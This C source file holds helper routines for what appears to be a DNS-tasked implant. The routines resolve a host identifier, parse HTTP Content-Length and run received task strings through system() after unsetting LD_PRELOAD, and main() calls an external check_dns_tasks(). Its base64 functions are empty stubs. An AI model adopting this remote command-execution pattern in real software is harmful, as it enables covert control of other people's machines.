#include "utils.h"

char ME[100]; //This is where the hostname will be stored

bool file_exists(char *filename)
{
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

char *getmyhostname()
{
    return ME;
}

void setmyhostname()
{
    char inbuff[1024];
    FILE *fh;

    // open the file in temp first
    if (file_exists("/tmp/X9999-host"))
    { // Connect to socket and write to file
        fh = fopen("/tmp/X9999-host", "r");

        if (fh == NULL)
        {
#ifdef TESTING
            printf("Failed to open the hostname file\n");
#endif
        }
        else
        {
#ifdef TESTING
            printf("hostname File opened ok.  Reading\n");
#endif

            fgets(inbuff, sizeof(inbuff), fh);
            if (inbuff[strlen(inbuff) - 1] == '\n')
            {
                inbuff[strlen(inbuff) - 1] = '\0';
            }

            fclose(fh);
#ifdef TESTING
            printf("Parsed Hostname :%s:\n", inbuff);
#endif
            strncpy(ME, inbuff, 99);
            return;
        }
    }
#ifdef TESTING
    printf("Didn't get it from X9999-host file\n");
#endif
    // if not possible check environment variable
    //  on windows set varname=value
    char *temp = getenv("HOSTNAME");
    if (temp != NULL)
    {
#ifdef TESTING
        printf("Environment var hostname:%s:\n", temp);
#endif
        strncpy(ME, temp, 99);
        return;
    }
#ifdef TESTING
    printf("Didn't get it from environment\n");
#endif
    // if not there use localhostname.
    if (gethostname(inbuff, 1024) == 0)
    { // Brilliant 0 is success on this one :(

        strncpy(ME, inbuff, 99);

#ifdef TESTING
        printf("Defaulting to own hostname :%s:\n", inbuff);
#endif
        return;
    }

    printf("Didn't get it from localhostname\n");
    sprintf(ME, "dunno"); // Unsafe but good enough
}

/* Runtask For Windows
void runtask(char *task) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    char *cmd = "c:\\Windows\\notepad.exe";
    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
}
*/

/* Runtask for Linux */
void runtask(char *task)
{
    unsetenv("LD_PRELOAD");
    system(task);
}

int get_content_length(char *response)
{
    char *start, *end;
    char content_len_str[100]; // content length won't be longer than 100 characters
    int len;

    start = strstr(response, "Content-Length: ");
    if (start == NULL)
    {
        return -1;
    }
    start += 16;
    end = start;
    while (*end && isdigit(*end))
    {
        end++;
    }
    len = end - start;
    strncpy(content_len_str, start, len);

    content_len_str[len] = '\0';
#ifdef TESTING
    printf("Content-Length: %s\n", content_len_str);
#endif

    return atoi(content_len_str);
}

void base64encode(char **in, char **out)
{
}

void base64decode(char **in, char **out)
{
}

extern void check_dns_tasks();

int main() {
    check_dns_tasks();
}